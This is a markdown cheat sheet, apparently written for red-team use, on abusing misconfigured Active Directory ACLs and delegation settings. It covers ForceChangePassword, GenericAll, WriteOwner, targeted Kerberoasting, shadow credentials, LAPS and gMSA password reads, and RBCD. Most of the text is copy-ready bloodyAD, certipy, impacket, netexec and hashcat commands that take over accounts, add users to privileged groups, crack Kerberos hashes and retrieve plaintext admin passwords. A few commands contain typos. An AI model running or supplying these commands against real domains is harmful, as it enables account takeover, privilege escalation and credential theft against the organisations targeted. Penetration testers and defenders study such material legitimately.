# ACL-CheatSheet

## 🔹 Overview

Active Directory Access Control Lists (ACLs) define **who can access or modify objects** such as users, groups, OUs, and computers.

By abusing misconfigured ACLs, attackers can escalate privileges, persist, or move laterally within a domain.

ACL-based attacks rely on **delegated permissions**, not exploits—making them very common in real-world environments.

---

## 🔹 Common ACL Abuse Techniques

---

## 🔸 ForceChangePassword

> Allows resetting another user's password without knowing the current one.

```bash id="acl_fc_1"
bloodyAD --host DC-Hostname -d domain -u username -p password set password target_username new_password
```

🔹 Impact:

* Immediate account takeover
* No need for current credentials

---

## 🔸 WriteOwner

> Allows changing ownership of an AD object.

```bash id="acl_wo_1"
bloodyAD --host DC-Hostname -d domain -u username -p password set owner target_group username
bloodyAD --host DC-Hostname -d domain -u username -p password add genericAll target_group target_username
```

🔹 Impact:

* Take ownership of objects
* Indirect privilege escalation via ownership abuse

---

## 🔸 GenericALL

> Full control over the target object.

### 1️⃣ On Organizational Unit (OU)

```bash id="acl_ga_ou"
bloodyAD --host DC -d domain -u username -p password add genericAll 'OU=OU_DN' target_username
```

---

### 2️⃣ On User

```bash id="acl_ga_user"
bloodyAD --host DC-Hostname -d domain -u username -p password set password target_username new_password
```

---

### 3️⃣ On Group

```bash id="acl_ga_group"
bloodyAD --host DC-Hostname -d domain -u username -p password add groupMember target_group target_username
```

🔹 Impact:

* Full compromise of object
* Can lead to domain escalation depending on target

---

## 🔸 GenericWrite on User

> Allows modification of object attributes but not full control.

### 🔹 Targeted Kerberoasting

```bash id="acl_gw_krb"
python3 targetedKerberoast.py -d domain --dc-ip DC-IP -u username -p password --dc-host DC-Hostname --request-user target_user
hashcat -m 13100 Hash rockyou.txt
```

---

### 🔹 Shadow Credentials

```bash id="acl_gw_shadow"
certipy shadow auto -u username@domain -p password -account target_username -dc-ip DC-IP
```

---

## 🔸 AddKeyCredentialLink

> Write access to `msDS-KeyCredentialLink` attribute (Shadow Credentials attack).

```bash id="acl_akcl"
certipy shadow auto -u username@domain -p password -account target_user -dc-ip ip
```

🔹 Impact:

* Steal authentication material without changing passwords
* Stealthy persistence technique

---

## 🔸 AddMember

> Allows adding users to a group.

```bash id="acl_addmember"
bloodyAD --host DC-Hostname -d domain -u username -p password add groupMember target_group user_to_add
```

🔹 Impact:

* Privilege escalation via group membership (e.g., Domain Admin groups)

---

## 🔸 AddSelf

> Allows a user to add themselves to a group.

```bash id="acl_addself"
bloodyAD --host DC-Hostname -d domain -u username -p password add groupMember target_group username
```

🔹 Impact:

* Self-privilege escalation
* Often found in delegated environments

---

## 🔸 WriteSPN

> Allows modifying Service Principal Names (SPNs).

```bash id="acl_spn"
python3 targetedKerberoast.py -d domain --dc-ip DC-IP -u username -p password --dc-host DC-Hostname --request-user target_user
hashcat -m 13100 Hash rockyou.txt
```

🔹 Impact:

* Enables Kerberoasting attacks
* Can lead to credential extraction of service accounts

---

## 🔸 ReadLAPSPassword

> Allows reading local administrator passwords stored via LAPS.

```bash id="acl_laps_1"
netexec ldap target -u username -p password -M laps
netexec smb target -u username -p password --laps

bloodyAD --host Target-Hostname -d domain -u username -p password get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

🔹 Impact:

* Retrieve plaintext local admin passwords
* Useful for lateral movement

---

## 🔸 ReadGMSAPassword

> Allows retrieving Group Managed Service Account (gMSA) passwords.

```bash id="acl_gmsa_1"
netexec ldap DC-IP -d domain -u username -p password --gmsa

bloodyAD --host DC-Hostname -d domain -u username -p password get object TargetObject --attr msDS-ManagedPassword
```



## UnConstained Delegation
```
bloodyAD --host DC-Hostname -d domain -u username -p password get add uac TargetComputer -f TRUSTED_FOR_DELEGATION
```



## Constained Delegation
1- Method 1: Configure constrained delegation from linux
```
bloodyAD --host DC-Hostname -d domain -u username -p password get add uac TargetComputer -f TRUSTED_TO_AUTH_FOR_DELEGATION
bloodyAD --host DC-Hostname -d domain -u username -p password get set object TargetComputer msDS-AllowedToDelegateTo -v 'ldap/DC-FQDN' -v 'cifs/DC-FQDN'
```

2- Method 2: Configure constrained delegation from Windows
```
Set-ADAccountControl -Identity TargetComputer -TrustedToAuthForDelegation $True
Set-ADObject -Identity "CN=TargetComputer-DN" -Add @{"msDS-AllowedToDelegateTo"=@("ldap/DC-FQDN","cifs/DC-FQDN")}
```



## RBCD
> AddAllowedToAct means that this user can edit the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer object. 
```
impacket-rbcd -delegate-from compromised_computer -delegate-to target_computer -dc-ip DC-IP -action write 'domain/username:password'
impacket-getST -spn 'cifs/target_computer' -impersonate administrator -dc-ip DC-IP 'domain/compromised_computer:password
KRB5CCNAME=administrator.ccache nxc smb 1target_computer -k --use-kcache  
```





🔹 Impact:

* Extract service account credentials
* Often leads to privilege escalation or persistence

---

# 🔹 Summary of Attack Paths

| Permission          | Impact                                              |
| ------------------- | --------------------------------------------------- |
| ForceChangePassword | Immediate account takeover                          |
| GenericALL          | Full control over object                            |
| WriteOwner          | Ownership hijacking                                 |
| GenericWrite        | Attribute abuse (Kerberoasting, Shadow Credentials) |
| AddMember / AddSelf | Group-based privilege escalation                    |
| WriteSPN            | Kerberoasting opportunity                           |
| ReadLAPSPassword    | Local admin password retrieval                      |
| ReadGMSAPassword    | Service account compromise                          |

---

# 🔹 Summary of Delegation Types

| Type                     | Key Attribute                              | Risk Level | Description                    |
| ------------------------ | ------------------------------------------ | ---------- | ------------------------------ |
| Unconstrained Delegation | `TRUSTED_FOR_DELEGATION`                   | 🔴 High    | Can impersonate any user       |
| Constrained Delegation   | `msDS-AllowedToDelegateTo`                 | 🟠 Medium  | Limited to specific services   |
| RBCD                     | `msDS-AllowedToActOnBehalfOfOtherIdentity` | 🔴 High    | Resource-controlled delegation |

---


# 🔹 Key Takeaways

* ACL misconfigurations are **one of the most common privilege escalation vectors in Active Directory**
* Many attacks rely on:

  * Misdelegated permissions
  * Over-permissive groups
  * Poor access control design
* Tools like:

  * **bloodyAD**
  * **certipy**
  * **Impacket**
  * **netexec**

  are commonly used to abuse these permissions.

---

# 🔹 Final Note

Understanding ACL abuse is critical because:

* It reflects **real-world Active Directory attack paths**
* It is heavily used in **red team engagements**
* It is often missed in basic security reviews

---
